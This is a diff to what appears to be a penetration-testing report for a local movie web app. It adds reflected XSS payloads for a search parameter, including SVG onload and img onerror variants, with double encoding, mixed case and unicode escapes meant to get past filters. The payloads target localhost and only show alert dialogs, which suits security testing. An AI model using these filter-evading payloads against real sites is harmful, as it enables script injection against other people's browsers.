@@ -162,13 +162,19 @@ curl -X POST http://localhost:5001/api/user/upload \
 **Advanced exploitation**:
 ```bash
 # URL encode the payload
-https://localhost:5173/movies?search=%3Csvg%2Fonload%3Dconfirm%281%29%3E
+http://localhost:5173/movies?search=%3Csvg%2Fonload%3Dconfirm%281%29%3E
 
 # Double encoding
-https://localhost:5173/movies?search=%253Csvg%252Fonload%253Dconfirm%25281%2529%253E
+http://localhost:5173/movies?search=%253Csvg%252Fonload%253Dconfirm%25281%2529%253E
 
 # Mixed case + encoding
-https://localhost:5173/movies?search=%3CiMg%20sRc%3Dx%20OnErRoR%3Dalert%281%29%3E
+http://localhost:5173/movies?search=%3CiMg%20sRc%3Dx%20OnErRoR%3Dalert%281%29%3E
+
+# Working payload (SVG XSS)
+http://localhost:5173/movies?search=%3Csvg%2Fonload%3Dconfirm%281%29%3E
+
+# Alternative working payload (IMG XSS with unicode)
+http://localhost:5173/movies?search=%3Cimg%20src%3Dx%20onerror%3D%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074%281%29%3E
 ```
 
 ### 3.2 Stored XSS in Reviews
